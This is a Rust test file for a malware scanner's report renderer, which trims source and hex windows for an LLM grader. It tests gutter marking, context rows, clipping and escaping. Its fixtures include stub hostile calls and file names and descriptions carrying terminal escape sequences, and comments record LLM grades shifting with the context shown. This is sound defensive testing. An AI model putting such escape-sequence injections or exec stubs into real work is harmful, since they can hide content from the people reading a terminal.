            rest.starts_with(' ')
                .then(|| u64::from_str_radix(gutter, 16).ok())
                .flatten()
                .map(|off| (off, marker))
        })
        .collect();
    assert!(!rows.is_empty(), "no byte rows rendered: {out}");
    for off in [0x1005u64, 0x1050] {
        let covering = rows.iter().rfind(|(row, _)| *row <= off).copied();
        assert!(covering.is_some(), "no row covers {off:x}: {out}");
        if let Some((gutter, marker)) = covering {
            assert_eq!(
                marker, ':',
                "row {gutter:x} holds the match at {off:x} but is not marked as a hit: {out}",
            );
        }
    }
    // Byte windows are evidence, not hinting: without the rows around a hex
    // hit a known-bad PE (`fffmpeg.exe`) went from hostile to benign on the
    // shipped prompt, though every finding description stayed.
    assert!(
        rows.iter().any(|(_, marker)| *marker == '-'),
        "a row with no match must be marked as context: {out}",
    );
}

/// The printable projection keeps strings and their boundaries, drops
/// the byte escapes, and still collapses UTF-16 runs.
#[test]
fn ascii_printable_keeps_strings_and_boundaries() {
    assert_eq!(
        ascii_printable(b"\x00getpwuid\x00\x7f\xffsetuid"),
        " getpwuid setuid"
    );
    assert_eq!(ascii_printable(b"a<b\\c"), "a<b\\c");
    assert_eq!(ascii_printable(b"\x7fELF\x02\x01\x01"), " ELF ");
    assert_eq!(ascii_printable(b"P\x00r\x00o\x00d\x00\x00\x00X"), "Prod X");
    assert_eq!(ascii_printable(b"plain text"), "plain text");
}

// ---------------------------------------------------------------------------
// Source blocks
// ---------------------------------------------------------------------------

/// A source chunk renders as blocks of *consecutive* lines, separated by a
/// blank line and with no blank line of their own at either edge: rows with
/// no match and no real code are dropped, and lines run together across the
/// gap would read as code that never existed.
#[test]
fn tiny_source_blocks_are_separated_and_edge_trimmed() {
    let src =
        "const alpha = requireSomething();\n}\n}\n}\n\nconst beta = exfiltrateSomething();\n\n}\n";
    let note = |id: &str, off: u64| Note {
        len: 5,
        ..ctx_note(id, Criticality::Notable, off)
    };
    let beta_off = src.find("const beta").expect("beta in source") as u64;
    let file = src_file(
        0,
        "/t/sample.js",
        90,
        vec![
            finding_with("a/first", Criticality::Notable),
            finding_with("b/second", Criticality::Notable),
        ],
        vec![Win {
            line: ContextLine {
                loc: 0,
                line: Some(1),
                col: Some(1),
                data: src.as_bytes().to_vec(),
            },
            notes: vec![note("a/first", 0), note("b/second", beta_off)],
        }],
    );
    let out = render(&report_with_files(vec![file]));

    // Skip the header line; the rest is the rendered body, less the
    // document's own trailing newline.
    let mut body: Vec<&str> = out.lines().skip(1).collect();
    while body.last().is_some_and(|l| l.is_empty()) {
        body.pop();
    }
    assert!(
        body.iter().any(|l| l.contains("const alpha"))
            && body.iter().any(|l| l.contains("const beta")),
        "both matched lines render: {out:?}",
    );
    assert!(
        !body.iter().any(|l| l.trim().is_empty() && !l.is_empty()),
        "a whitespace-only row is padding, not content: {out:?}",
    );
    let blanks: Vec<usize> = body
        .iter()
        .enumerate()
        .filter(|(_, l)| l.is_empty())
        .map(|(i, _)| i)
        .collect();
    assert!(
        blanks.windows(2).all(|w| w[1] != w[0] + 1),
        "blocks are separated by exactly one blank line: {out:?}",
    );
    assert!(
        body.first().is_some_and(|l| !l.is_empty()) && body.last().is_some_and(|l| !l.is_empty()),
        "the body must not open or close on a blank line: {out:?}",
    );
}

/// One chunk spanning a context line and the hit line splits into physical
/// rows: the context row renders as bare source, the hit row under a
/// `{marker} SEV LINE:COL desc` annotation.
#[test]
fn tiny_merges_and_annotates_context() {
    let mut report = create_test_report(vec![Finding {
        desc: "socket usage".into(),
        conf: 0.8,
        ..finding_with("net/socket", Criticality::Notable)
    }]);
    // Line 4 "ctx before" is bytes 40..50, then '\n', then line 5
    // "s = socket()" at byte 51; the match's 'o' sits at byte 56 → column 6.
    annotate(
        &mut report.files[0],
        vec![Win {
            line: ContextLine {
                loc: 40,
                line: Some(4),
                col: Some(1),
                data: b"ctx before\ns = socket()".to_vec(),
            },
            notes: vec![Note {
                crit: Criticality::Notable,
                id: "net/socket".into(),
                desc: "socket usage".into(),
                off: 56,
                len: 6,
                conf: 0.8,
            }],
        }],
    );
    let output = render(&report);
    assert!(output.contains("ctx before"), "{output:?}");
    assert!(!output.contains(".\t4"), "{output:?}");
    assert!(output.contains("// N 5:6 socket usage"), "{output:?}");
    assert!(output.contains("s = socket()"), "{output:?}");
}

/// Two traits matching the same span on one line: even handed both notes,
/// the view announces only the strongest above the single, unaltered source
/// line, never stacking both halves of an overlapping pair.
#[test]
fn tiny_overlapping_notes_show_only_strongest() {
    let mut report = create_test_report(vec![
        Finding {
            desc: "decode+exec".into(),
            ..finding_with("a/strong", Criticality::Hostile)
        },
        Finding {
            desc: "exec call".into(),
            ..finding_with("b/weak", Criticality::Notable)
        },
    ]);
    annotate(
        &mut report.files[0],
        vec![Win {
            line: ContextLine {
                loc: 0,
                line: Some(1),
                col: Some(1),
                data: b"exec(payload)".to_vec(),
            },
            notes: vec![
                Note {
                    len: 13,
                    ..ctx_note("a/strong", Criticality::Hostile, 0)
                },
                ctx_note("b/weak", Criticality::Notable, 0),
            ],
        }],
    );
    let output = render(&report);
    assert!(output.contains("// H 1:1 decode+exec"), "{output:?}");
    assert!(!output.contains("b/weak"), "{output:?}");
    assert!(!output.contains("exec call"), "{output:?}");
    assert!(output.contains("exec(payload)"), "{output:?}");
}

/// Two hits far apart are separate windows, set apart by a blank line so
/// they don't read as one run of code.
#[test]
fn tiny_separates_non_contiguous_windows_with_blank_line() {
    let mut report = create_test_report(vec![
        finding_with("a/one", Criticality::Suspicious),
        finding_with("b/two", Criticality::Suspicious),
    ]);
    let window = |loc: u64, line: u64, data: &[u8], id: &str| Win {
        line: ContextLine {
            loc,
            line: Some(line),
            col: Some(1),
            data: data.to_vec(),
        },
        notes: vec![ctx_note(id, Criticality::Suspicious, loc)],
    };
    annotate(
        &mut report.files[0],
        vec![
            window(0, 5, b"first_hit(x)\n", "a/one"),
            window(200, 50, b"second_hit(y)\n", "b/two"),
        ],
    );
    let output = render(&report);
    assert!(
        output.contains("first_hit(x)\n\n// S 50:1"),
        "windows must be blank-line separated: {output:?}"
    );
}

/// A finding that has a byte offset but no window of its own was dominated
/// by a stronger overlapping match at that span; the view does not bring it
/// back as a location-less note.
#[test]
fn tiny_does_not_resurrect_dominated_finding_location_less() {
    let mut dominated = finding_with("b/dominated", Criticality::Suspicious);
    dominated.desc = "b/dominated desc".into();
    dominated.evidence = vec![Evidence::new("m", "s", "x").with_offset(0)];
    let mut winner = finding_with("a/win", Criticality::Hostile);
    winner.desc = "a/win desc".into();
    let mut report = create_test_report(vec![winner, dominated]);
    annotate(
        &mut report.files[0],
        vec![Win {
            line: ContextLine {
                loc: 0,
                line: Some(7),
                col: Some(1),
                data: b"winner()".to_vec(),
            },
            notes: vec![Note {
                len: 6,
                ..ctx_note("a/win", Criticality::Hostile, 0)
            }],
        }],
    );
    let output = render(&report);
    assert!(output.contains("// H 7:1 a/win desc"), "{output:?}");
    assert!(!output.contains("b/dominated"), "{output:?}");
}

/// A slice of an ultra-long single line renders as a pseudo-line labelled
/// `line:col`: the chunk starts at column 601, so the match six bytes in is
/// column 607, and a leading `...` marks the clipped left side.
#[test]
fn tiny_long_line_slice_shows_line_col() {
    let mut report = create_test_report(vec![Finding {
        desc: "obfuscated loop".into(),
        ..finding_with("obf/loop", Criticality::Suspicious)
    }]);
    annotate(
        &mut report.files[0],
        vec![Win {
            line: ContextLine {
                loc: 600,
                line: Some(1),
                col: Some(601),
                data: b"while(!![]){...}".to_vec(),
            },
            notes: vec![ctx_note("obf/loop", Criticality::Suspicious, 606)],
        }],
    );
    let output = render(&report);
    assert!(output.contains("// S 1:607 obfuscated loop"), "{output:?}");
    assert!(
        output.contains("..."),
        "leading ellipsis marks the clip: {output:?}"
    );
}

// ---------------------------------------------------------------------------
// Sanitization
// ---------------------------------------------------------------------------

/// The source renderer's funnel both escapes and keeps the byte-offset map
/// aligned, so a match landing on a control byte points at its escape.
#[test]
fn expand_tabs_escapes_and_maps_control_chars() {
    let (display, map) = expand_tabs("a\u{1b}b\tc");
    assert_eq!(display, "a\\u{1b}b  c");
    // Byte 1 of the input is the ESC; its map slot points at the start of
    // the escape text, and byte 2 ('b') points past it.
    let esc_start = map[1];
    assert_eq!(display.get(esc_start..esc_start + 4), Some("\\u{1"));
    assert_eq!(map[2], esc_start + 6);
    // The tab maps to the start of its two-space expansion.
    assert_eq!(display.get(map[3]..map[3] + 2), Some("  "));
}

/// Sample text reaches the grader inert: a terminal control or line break in
/// a source row, a description or a path is shown as an escape, never sent
/// raw. The final boundary passes SGR colors, so a sample's own color codes
/// must be escaped before it.
#[test]
fn sample_controls_render_as_visible_escapes() {
    let file = src_file(
        0,
        "/x/evil\u{1b}[2J.py",
        50,
        vec![Finding {
            desc: "runs \u{1b}[30;40mhidden\ncode".into(),
            ..finding_with("t/one", Criticality::Notable)
        }],
        vec![ctx_line(
            1,
            "run('\u{1b}[31mred\u{1b}[0m')",
            Some(ctx_note("t/one", Criticality::Notable, 1)),
        )],
    );
    let tiny = render(&report_with_files(vec![file]));
    assert!(
        !tiny.contains('\u{1b}'),
        "a raw ESC reached the render: {tiny:?}"
    );
    assert!(tiny.contains("run('\\u{1b}[31mred"), "{tiny:?}");
    assert!(tiny.contains("evil\\u{1b}[2J.py"), "{tiny:?}");
    assert!(tiny.contains("hidden\\u{a}code"), "{tiny:?}");
}

/// A source window whose one finding sits on the `hit` line of `src`.
fn one_hit_window(src: &str, hit: &str) -> FileAnalysis {
    let off = src.find(hit).expect("hit line in source") as u64;
    src_file(
        0,
        "/t/sample.py",
        90,
        vec![finding_with("a/first", Criticality::Notable)],
        vec![Win {
            line: ContextLine {
                loc: 0,
                line: Some(1),
                col: Some(1),
                data: src.as_bytes().to_vec(),
            },
            notes: vec![Note {
                len: 5,
                ..ctx_note("a/first", Criticality::Notable, off)
            }],
        }],
    )
}

/// Only the rows beside a finding are drawn: one each side, however much the
/// window captured. No context at all lost three LLM fixture grades; more
/// than one changed none (2026-11-27).
#[test]
fn source_window_keeps_one_row_each_side_of_a_finding() {
    let src =
        "import os\nfar_above = 1\njust_above = 2\nos.system(cmd)\njust_below = 3\nfar_below = 4\n";
    let out = render(&report_with_files(vec![one_hit_window(src, "os.system")]));

    for kept in ["just_above = 2", "os.system(cmd)", "just_below = 3"] {
        assert!(out.contains(kept), "{kept:?} is beside the finding: {out}");
    }
    for dropped in ["import os", "far_above", "far_below"] {
        assert!(
            !out.contains(dropped),
            "{dropped:?} is not beside the finding: {out}"
        );
    }
}

/// A file's leading comment says what the code is for, so it is drawn whole
/// even when a finding's window swallowed it. Trimmed with the rest, an
/// exploit proof of concept lost its "authorized testing only" docstring and
/// graded hostile, and a password-reuse guard lost the header explaining that
/// only a salted hash is kept and graded as a credential stealer.
#[test]
fn source_window_keeps_the_leading_comment_whole() {
    let src = "#!/usr/bin/env python3\n\"\"\"Proof of concept for the upload flaw.\n\nUse only against systems you are authorized to test.\n\"\"\"\nimport os\nfar_above = 1\njust_above = 2\nos.system(cmd)\n";
    let out = render(&report_with_files(vec![one_hit_window(src, "os.system")]));

    assert!(
        out.contains("Proof of concept for the upload flaw.")
            && out.contains("Use only against systems you are authorized to test."),
        "the docstring is drawn whole: {out}",
    );
    assert!(
        out.contains("just_above = 2") && out.contains("os.system(cmd)"),
        "{out}"
    );
    assert!(
        !out.contains("import os") && !out.contains("far_above"),
        "code after the comment is still trimmed to the finding's rows: {out}",
    );
}

/// A comment that is not the file's leading one is context like any other
/// row: keeping every comment row grew the render without holding a grade
/// the leading comment alone did not.
#[test]
fn source_window_trims_comments_below_the_first_code_row() {
    let src = "import os\n# set up\nfar_above = 1\njust_above = 2\nos.system(cmd)\n";
    let out = render(&report_with_files(vec![one_hit_window(src, "os.system")]));

    assert!(out.contains("os.system(cmd)"), "{out}");
    assert!(
        !out.contains("# set up"),
        "a later comment is trimmed: {out}"
    );
}

/// A long row is clipped to [`SOURCE_WIDTH`] columns around its match, with
/// `...` on each clipped side.
#[test]
fn source_row_is_clipped_around_its_match() {
    let pad = "x".repeat(600);
    let src = format!("{pad} os.system(cmd) {pad}\n");
    let out = render(&report_with_files(vec![one_hit_window(&src, "os.system")]));

    let row = out
        .lines()
        .find(|l| l.contains("os.system(cmd)"))
        .unwrap_or_else(|| panic!("the matched row renders: {out}"));
    assert!(row.starts_with("...") && row.ends_with("..."), "{row}");
    assert!(
        row.chars().count() <= SOURCE_WIDTH + 2 * "...".len(),
        "row is {} columns: {row}",
        row.chars().count(),
    );
}
